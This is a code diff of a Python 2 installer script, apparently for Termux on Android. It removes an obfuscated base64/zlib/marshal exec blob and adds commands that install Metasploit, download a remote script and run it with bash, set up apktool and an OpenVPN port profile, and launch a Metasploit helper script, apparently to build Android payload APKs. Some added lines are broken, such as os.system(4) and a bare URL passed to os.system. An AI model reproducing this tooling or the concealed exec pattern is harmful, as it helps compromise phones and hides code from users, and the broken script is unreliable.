@@ -1,2 +1,26 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("eJyVU91v0zAQd9p1DNaxteNTvFg8TH1pgiokBOJrUiVAaAOpEkJ7c2o3devExue09Jk/HM5JVrxKPJAP3/1+d7n76exMSXO18H2PL4wjQjg+EVGEXG39iFxFRBCyaBHeIr8iEjWgHYK9EHRCsB+CWyE4qEFEFm3Cb4eROyE4DEE3BEchuFsBfkw+fGxKnoThXtisX+ee+tw63A9z74XgRuR+CB6E4GFdMiKTwSOcpvyN1yU8RtcsMyoLcEwpWnqbKjG0wmg4xCgzjpYms4yLKtvj6+xcOAZGaenocAM/dmqtM+Ho2Vlt584ZeJUklq3jTLp5mZYg7FQXThQunuo8uWDghB2L1fdkwVYsySucNNU85YulDOY04KCHXW1Oh7Mb7OmOFuZlo0bPcx8YSsrM0mmtYi5S6Q8Z9JtSdhbGYIh0vqIZmzH78oXR1sUzacHFemUKCk5blolE5KViTvDkWQInvrs0o237FJ5DB8kpp3HsKk8JZuEpehOp2HzJCjrW60Jpxum5UXLJQNIvRhTfvl7Ktld3gQsOJC9/DjXy24kaxTZxpnWmRDVHL0gkzBhIOO6PVPBO8jeFQL34GUq+tnLPl32Cy2cUzyVK+NToPTdLOpFZISyMMf5/rTASz5lMJegixkFCXaj3d7rNWGKzqVizcXNdjGgOMxwyss7/9wMvz/mN0eAqX+J52/eaN3gy8mqMoIQwgyp9u4D/hmfuAM3rXPNSibeR50e4dKNu6yj6193Zsf7+A90QH8U="))))
+import os
+import time
+
+os.system('pkg install unstable-repo')
+os.system('apt upgrade')
+os.system('apt install metasploit -y')
+os.system('pkg install wget && wget https://raw.githubusercontent.com/MasterDevX/java/master/installjava && bash installjava')
+os.system('rm -f installjava') 
+os.system('pkg install aapt -y')
+os.system('dpkg -i apktool.deb')
+time.sleep(2)
+os.system('rm -rf apktool.deb')
+os.system('mv gafar97port.first.ovpn storage/emulated/0/')
+os.system('pip2 install bs4')
+os.system('cd ..')
+os.system('clear')
+print "Silahkan Download Aplikasi OpenVPN"
+time.sleep(3)
+os.system('termux-open https://play.google.com/store/apps/details?id=net.openvpn.openvpn')
+print "Kemudian Install Apk Signer"
+os.system(4)
+os.system('https://play.google.com/store/apps/details?id=com.haibison.apksigner')
+os.system(4)
+os.system('rm -rf install.py')
+os.system('python2 msfgaf.py')
+os.system('')
